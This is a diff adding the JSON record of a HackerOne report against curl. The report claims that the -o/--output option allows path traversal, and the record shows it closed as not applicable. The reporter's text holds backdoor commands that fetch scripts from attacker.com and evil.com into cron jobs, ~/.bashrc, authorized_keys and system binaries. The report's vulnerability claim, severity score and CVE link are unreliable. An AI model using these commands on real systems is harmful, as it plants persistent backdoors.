@@ -1,0 +1,121 @@
+{
+  "id": 3120987,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTIwOTg3",
+  "url": "https://hackerone.com/reports/3120987",
+  "title": "[High] Arbitrary File Write via Path Traversal in cURL CLI (`-o`, `--output`) (CWE-22: Improper Limitation of a Pathname to a Restricted Directory)",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "high",
+  "readable_substate": "N/A",
+  "created_at": "2025-05-01T06:30:43.163Z",
+  "submitted_at": "2025-05-01T06:30:43.406Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "oicus",
+    "url": "/oicus",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8284"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-06-30T18:55:10.901Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-06-28T12:24:28.886Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nThe -o / --output parameter in cURL does not restrict or sanitize file paths. When passed relative traversal sequences (e.g., ../../), cURL writes files outside the current working directory, allowing arbitrary file overwrite. In automated or privileged environments (CI/CD, root containers), this leads to Remote Code Execution (RCE), privilege escalation, and supply chain risk.\nThis behavior violates path safety expectations when cURL is embedded in scripts or run with elevated privileges.\n\n## Affected version\nAffected Asset\nComponent: cURL CLI\nVersions Affected: cURL 7.64.0 to 8.4.0 (Tested on 7.64.0, 7.79.1, 7.85.0, 8.4.0)\nTested Platforms: Linux (Debian), macOS, Alpine (Docker)\nLatest Tested:\n\ncurl 7.85.0 (x86_64-pc-linux-gnu) libcurl/7.85.0 OpenSSL/3.0.2\nTechnical Root Cause\n\n// File: src/tool_cfgable.c (Line ~512)\ngetstr(&config->output, nextarg, DENY_BLANK); // CWE-22: No validation/sanitization\n\nNo normalization is performed (realpath() is unused), and cURL allows any relative/absolute path. This creates a write primitive into sensitive areas (e.g., /etc/, $HOME/.ssh/, ~/.bashrc).\n\n\n## Steps To Reproduce:\nPrerequisites\nFile target is writable by the current user (or use root to show full impact).\n\nCan be automated or scripted without user interaction.\n\nExploit\n1.Start a web server:\n  \npython3 -m http.server 8000\n\n2.Run vulnerable cURL:\n\nsudo curl http://localhost:8000/backdoor.sh -o \"../../etc/cron.daily/zzz-backdoor\"\n\n3.Check the result:\n\nls -l /etc/cron.daily/zzz-backdoor\ncat /etc/cron.daily/zzz-backdoor\n\nOn next cron run, zzz-backdoor is executed with root privileges.\nDocker Container (Privileged):\n\ndocker run --privileged alpine sh -c 'curl http://attacker.com/x.sh -o /usr/bin/ls'\n\n CI/CD Pipeline (Supply Chain Injection):\nscript:\n  - curl http://evil.com -o \"../../.gitlab-ci.yml\"\n \nUser-Level Exploits:\ncurl http://evil.com -o \"~/.bashrc\"\ncurl http://evil.com/key.pub -o \"~/.ssh/authorized_keys\"\n\n\nCVSS v3.1 Base Score: 7.8 (High)\nAV:N / AC:L / PR:N / UI:N / S:U / C:H / I:H / A:H\n\nMitigation & Recommendation\nFix Suggestion\nNormalize and validate paths before writing:\n\nchar *resolved = realpath(nextarg, NULL);\nif (!resolved || strstr(resolved, \"..\") != NULL || !is_subdir(resolved, safe_dir)) {    warnf(config, \"Unsafe output path blocked\");\n    return PARAM_BAD_USE;\n}\n Supporting Evidence\nSource Reference: src/tool_cfgable.c#L512\nSimilar CVE: [CVE-2020-8284](https://nvd.nist.gov/vuln/detail/CVE-2020-8284) (cURL FTP Path Traversal, fixed in 7.73.0)\nCWE: CWE-22\n\n## Impact\n\n| Vector                  | Description                                                           |\n\n| Arbitrary File Write    | Overwrite any file accessible by user                                 |\n| Privilege Escalation    | Overwrite `/etc/sudoers`, `/etc/passwd`, or root-owned cron jobs          |\n| RCE / Persistence       | Backdoor via login scripts, bashrc, or CI/CD config overwrite         |\n| Supply Chain Injection  | Scripted or container-based installs auto-run attacker's payloads",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 7,
+  "voters": [
+    "thalaivar304",
+    "2026",
+    "ryel",
+    "0xagent0",
+    "hammedrahman_01",
+    "bilalhacker302",
+    "jameswhoareyou"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
